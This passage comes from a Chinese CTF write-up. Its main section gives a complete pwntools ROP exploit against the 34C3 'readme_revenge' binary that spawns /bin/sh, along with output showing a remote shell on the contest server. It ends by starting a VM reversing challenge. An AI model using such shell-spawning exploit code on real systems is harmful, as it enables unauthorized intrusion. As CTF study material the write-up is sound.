    print p.recvuntil("}")
    p.close()
16分之一的概率，多跑几次就能拿到flag了。
### revenge
> 描述:This pwn is from 34C3 CTF. But in our dome, you MUST get shell!
    $ md5sum revenge 
    75bb692f5cd51ba4143a42fc4948b025  revenge
    # lee @ lee-Lenovo in ~/Videos/xnuca_2018 [22:23:20] 
    $ md5sum readme_revenge 
    75bb692f5cd51ba4143a42fc4948b025  readme_revenge
这道题是34c3原题,不过这里需要`get shell`,
感谢[0xddaa](https://github.com/0xddaa/ctfcode/blob/717921b68a3a5deb41a1db5625666983a18a0d58/exp/2017/34c3ctf/readme_revenge.py)  
poc:
    #!/usr/bin/env python
    import sys, os
    from pwn import *
    from struct import pack
    HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
    elf = ELF('readme_revenge'); context.word_size = elf.elfclass
    with context.local(log_level='ERROR'):
        libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
    if not libc: log.warning('Cannot open libc.so.6')
    r = remote(HOST, PORT)
    pause()
    jmp1 = 0x46D935 
    jmp2 = 0x46d935
    name = 0x6b73e0
    rop_addr = 0x6b7ab0 
    pop_rdi = 0x400525
    pop_rsi = 0x4059d6 
    pop_rdx = 0x435435
    pop_rax = 0x43364c
    syscall = 0x45fa15
    binsh_addr = 0x6b7a38 
    rop = flat(pop_rdi, binsh_addr, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall)
    exp = flat(jmp1, jmp2, 0, 0)
    exp = exp.ljust(1248, '\x90') + p64(0x00000000004a1a79)
    exp = exp.ljust(1328, '\x90') + p64(rop_addr)
    exp = exp.ljust(1608, 'a')
    exp += p64(0x6b7048+8) + p64(0) 
    exp += '/bin/sh'.ljust(112, '\x00')
    exp += p64(0x6b7048)#"i"*8
    exp += rop
    r.sendline(exp)
    r.send('g'*0x300)
    r.interactive()
result:
    $ python reverge.py 117.50.39.111 26436
    [*] '/home/lee/Videos/xnuca_2018/readme_revenge'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [!] Cannot open libc.so.6
    [+] Opening connection to 117.50.39.111 on port 26436: Done
    [*] Paused (press any to continue)
    [*] Switching to interactive mode
    $ cat flag
    flag{005387f7-4d2d-4530-8d57-f20d4c34f493}
## rev
### Code Interpreter
打开一看是虚拟机题，虚拟机只有十条指令，基本的操作模式差不多，只要注意其中mul、rshift和push指令的操作数是立即数，其他指令的操作数是寄存器即可。  
写出反汇编器
    with open("code") as f:
        code = map(ord, f.read())
    print code